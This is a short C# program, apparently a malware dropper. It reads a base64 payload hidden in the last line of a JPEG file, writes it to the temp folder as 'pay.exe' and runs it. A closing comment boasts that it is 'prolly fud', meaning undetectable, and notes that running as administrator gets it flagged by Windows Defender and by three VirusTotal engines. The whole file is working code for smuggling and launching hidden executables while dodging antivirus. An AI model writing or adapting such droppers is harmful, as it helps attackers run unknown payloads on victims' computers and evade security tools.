using System.IO;
using System.Linq;
using System.Diagnostics;
using System;
public class Dropped
{
    public static void Main()
    {
        string path = Path.GetTempPath();
        string path2 = Directory.GetCurrentDirectory();
        string image = path2 + "\\test_image.jpg";
        var last_line = File.ReadLines(image).Last().ToString();
        var base64_decode = Convert.FromBase64String(last_line);
        File.WriteAllBytes(path + "pay.exe", base64_decode);
        Process ps = new Process();
        ps.StartInfo.FileName = path + "pay.exe";
        ps.Start();
    }
}

//prolly fud but can't handle being required to run as admin since that somehow makes it detected by windows defender and 3 on vt